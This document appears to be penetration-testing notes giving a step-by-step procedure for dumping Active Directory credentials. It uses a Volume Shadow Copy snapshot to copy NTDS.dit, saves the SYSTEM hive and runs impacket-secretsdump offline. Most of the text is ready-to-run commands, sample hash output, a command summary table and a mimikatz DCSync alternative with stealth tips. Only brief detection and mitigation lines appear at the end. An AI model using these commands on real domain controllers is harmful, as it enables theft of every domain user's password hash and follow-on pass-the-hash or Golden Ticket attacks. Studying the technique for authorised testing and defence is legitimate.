# **Volume Shadow Copy Service (VSS)**  
**Description**:  
A Microsoft technology that creates snapshots ("shadow copies") of files/volumes, even while in use. Used for backups, but abused by attackers to extract sensitive files like the NTDS.dit database (contains AD credentials).  

**Key Files**:  
- **NTDS.dit**: Active Directory database storing user credentials, groups, and objects.  
- **SYSTEM hive**: Contains the boot key to decrypt the NTDS.dit.  

---

## **Prerequisites**  
1. **Domain Admin Access**: Required to execute commands on a Domain Controller (DC).  
2. **Tools**:  
   - `vshadow.exe` (Windows SDK tool, signed by Microsoft).  
   - `impacket-secretsdump` (Kali Linux tool for offline credential extraction).  

---

## **Step-by-Step Exploitation**  

### **1. Create a Shadow Copy**  
**Command**:  Note should run on _CMD_
``` cmd  
vshadow.exe -nw -p C:  
```  
- **`-nw`**: Disables VSS writers (reduces backup time).  
- **`-p`**: Preserves the shadow copy on disk.  

**Output**:  
``` cmd
Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2  
```  
*Note the shadow copy device name for file extraction.*  

---

### **2. Extract NTDS.dit & SYSTEM Hive**  
**Copy NTDS.dit**:  
``` cmd  
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\ntds.dit.bak  
```  

**Export SYSTEM Hive**:  
```cmd  
reg.exe save HKLM\SYSTEM C:\system.bak  
```  

---

### **3. Transfer Files to Kali**  
- Use tools like `smbserver.py` (Impacket), SCP, or PowerShell uploads to move `ntds.dit.bak` and `system.bak` to Kali.  

---

### **4. Extract Credentials with Impacket**  
**Command**:  
```bash  
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL  
```  

**Output**:  
```  
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
Administrator:500:aad3b435b51404ee...:2892d26cdf84d7a70e2eb3b9f05c425e:::  
krbtgt:des-cbc-md5:683bdcba9e7c5de9  
```  
*Extracts NTLM hashes, Kerberos keys, and plaintext passwords (if available).*  

---

## **Alternative Methods**  
### **DC Sync Attack (Mimikatz)**  
**Command**:  
```bash  
lsadump::dcsync /user:krbtgt  
```  
- **Stealthier**: No file extraction; directly pulls credentials from AD.  
- Requires administrative privileges.  

---

## **Considerations**  
- **Detection**: VSS abuse creates logs (Event ID 7036 for VSS service start).  
- **Stealth**: Use DC Sync for quieter persistence.  
- **Use Cases**:  
  - **Penetration Testing**: Quick credential harvesting.  
  - **Red Teaming**: Prioritize stealth with DC Sync or living-off-the-land techniques.  

---

## **Commands Summary**  
| Step               | Command                                                                 |  
|--------------------|-------------------------------------------------------------------------|  
| Create Shadow Copy | `vshadow.exe -nw -p C:`                                                |  
| Copy NTDS.dit      | `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\...\ntds.dit C:\`|  
| Export SYSTEM Hive | `reg.exe save HKLM\SYSTEM C:\system.bak`                               |  
| Extract Hashes     | `impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL`         |  

---

**Impact**: Obtains all AD user hashes for pass-the-hash, Golden Ticket attacks, or credential cracking.  
**Mitigation**: Restrict Domain Admin privileges, monitor VSS activity, and protect NTDS.dit/SYSTEM hive access.
